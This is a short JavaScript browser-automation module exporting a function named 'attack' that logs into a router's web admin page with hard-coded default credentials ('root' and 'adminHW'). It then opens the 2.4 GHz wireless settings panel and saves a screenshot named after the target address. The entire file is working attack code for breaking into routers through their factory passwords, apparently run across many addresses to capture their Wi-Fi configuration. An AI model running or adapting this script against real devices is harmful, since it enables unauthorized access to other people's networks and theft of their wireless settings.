const defaultUsername = "root";
const defaultPassword = "adminHW";

export default async function attack(page, endereco) {

    await (await page.waitForSelector("#txt_Username", {
        timeout: 5000
    })).focus();
    await page.keyboard.type(defaultUsername);

    await (await page.waitForSelector("#txt_Password", {
        timeout: 5000
    })).focus();
    await page.keyboard.type(defaultPassword);

    await page.click("#button");

    await (await page.waitForSelector('div[name="maindiv_WlanBasic2G"]', {
        timeout: 5000
    })).click();

    await page.waitForTimeout(20000);
    await page.screenshot({
        path: `./fotos/${endereco}.png`
    });
}